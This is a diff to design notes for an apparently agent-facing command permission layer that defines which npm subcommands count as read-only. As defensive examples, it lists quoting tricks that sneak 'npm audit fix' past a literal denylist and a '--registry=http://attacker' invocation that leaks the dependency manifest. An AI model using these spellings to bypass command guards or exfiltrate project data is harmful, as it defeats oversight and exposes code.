@@ -187,13 +187,39 @@ policy even though neither can write anything:
   substitution guard described below, so only the bare navigation form
   is ever classified read-only.
 - `npm`: a curated positive allowlist of read-only subcommands — `ls` /
-  `list` (installed tree), `view` (registry metadata), `outdated`,
-  `why`, `ping` — plus bare `npm audit` (the report). `npm audit fix`
-  mutates the lockfile and `node_modules` and stays gated even though
-  `npm audit` alone is floored. Every other npm subcommand (`install`,
-  `ci`, `publish`, `update`, `version`, ...) stays unclassified: the
-  allowlist is positive, not a denylist, so an npm verb this floor has
-  not reasoned about is never assumed safe.
+  `list` (installed tree), `view` / `info` / `show` (registry metadata;
+  `info` and `show` are npm's own aliases for `view`), `outdated`,
+  `why` / `explain` (dependency-reason report), `ping` — plus `npm
+  audit` and `npm audit signatures` (both reports). Only CANONICAL
+  spellings are floored: aliases like `la` / `ll` (for `ls -la` / `ls
+  -l`) and `v` (for `view`) are deliberately excluded, and stay gated
+  rather than miscategorized.
+
+  `npm audit fix` mutates the lockfile and `node_modules` and stays
+  gated even though bare `npm audit` is floored. This is enforced as a
+  POSITIVE shape, not a denylist on the literal word `fix`: every token
+  after `audit` must either start with `-` (a flag) or be the literal
+  `signatures`, or the whole command forfeits the floor. A denylist on
+  `fix` is a shell-quoting bypass — `npm audit "fix"`, `'fix'`, `f''ix`,
+  `fi"x"`, and `$'fix'` all reach npm as the plain argument `fix` (npm's
+  own arg parsing strips the quoting) while none of those raw tokens
+  equals the string `fix`, so an equality check on the untouched argv
+  would silently pass every one of them through to the mutating path.
+  The positive shape closes all such spellings, and any future npm
+  subcommand this floor has not reasoned about, in one rule; it fails
+  closed on `npm audit --audit-level high` (a separated flag value),
+  an acceptable, conservative false negative.
+
+  A `--registry`, `--userconfig`, or `--globalconfig` token anywhere in
+  an npm invocation forfeits the floor regardless of subcommand: these
+  redirect npm's registry or config lookups to an operator-unverified
+  location, so `npm audit --registry=http://attacker` would submit the
+  full dependency manifest to that host — exfiltration, not a safe read.
+
+  Every other npm subcommand (`install`, `ci`, `publish`, `update`,
+  `version`, ...) stays unclassified: the allowlist is positive, not a
+  denylist, so an npm verb this floor has not reasoned about is never
+  assumed safe.
 
 Bins excluded entirely from the floor (no per-bin guard possible):
 
